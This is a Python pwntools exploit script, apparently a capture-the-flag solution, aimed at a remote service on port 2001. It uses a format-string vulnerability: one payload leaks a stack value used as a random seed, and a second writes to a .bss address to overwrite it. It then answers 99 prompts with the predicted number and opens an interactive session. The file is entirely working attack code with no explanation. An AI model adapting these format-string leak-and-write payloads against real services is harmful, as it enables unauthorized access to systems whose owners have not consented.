from pwn import *
from ctypes import *

bss = 0x602020
LIBC = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc-2.27.so")

def seed():
    p = remote("35.243.188.20",2001)
    p.sendlineafter("name? ","%8$x")
    p.recvuntil("Welcome ")
    seed = int(p.recvline(),16)
    p.close()
    return seed

def exploit(seed):
    p = remote("35.243.188.20",2001)
    p.sendlineafter("name? ","%9c%11$n"+p64(bss))
    seed = int(seed) + 9
    for i in range(99):
        p.sendlineafter("number: ",str(seed))
    p.interactive()

seed = seed()
log.info("Seed : "+str(seed))
exploit(str(seed))
